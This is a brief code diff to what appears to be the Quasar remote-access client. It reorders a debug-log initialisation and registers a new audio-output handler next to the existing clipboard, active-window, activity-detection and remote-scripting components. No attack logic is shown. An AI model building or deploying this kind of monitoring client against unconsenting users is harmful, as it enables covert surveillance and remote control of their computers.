@@ -142,13 +142,13 @@ namespace Quasar.Client
                 _connectClient.ClientState += ConnectClientOnClientState;
                 InitializeMessageProcessors(_connectClient);
 
-                _debugLog = new DebugLog(_connectClient);
 
                 _userActivityDetection = new ActivityDetection(_connectClient);
                 _userActivityDetection.Start();
 
                 _activeWindowChecker = new ActiveWindowChecker(_connectClient);
                 _clipboardChecker = new ClipboardChecker(_connectClient);
+                _debugLog = new DebugLog(_connectClient);
 
                 new Thread(() =>
                 {
@@ -225,6 +225,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new WebsiteVisitorHandler());
             _messageProcessors.Add(new RemoteScriptingHandler());
             _messageProcessors.Add(new AudioHandler());
+            _messageProcessors.Add(new AudioOutputHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
